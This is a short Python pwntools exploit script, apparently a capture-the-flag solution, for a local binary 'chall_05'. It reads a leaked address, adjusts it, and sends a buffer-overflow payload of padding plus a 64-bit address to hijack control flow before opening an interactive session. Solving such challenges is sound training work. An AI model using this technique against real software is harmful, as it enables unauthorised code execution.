from pwn import *
def main():
	p = process("./chall_05")
	print(p.recv())
	p.sendline()
	addr = p.recv().decode().split("0x")[1] 
	addr = hex(int(addr, 16) - 19)
	payload = ((72 - 16) * chr(int("00", 16))).encode() + p64(int(addr,16))
	print(payload)
	p.sendline(payload)
	p.interactive()
main()
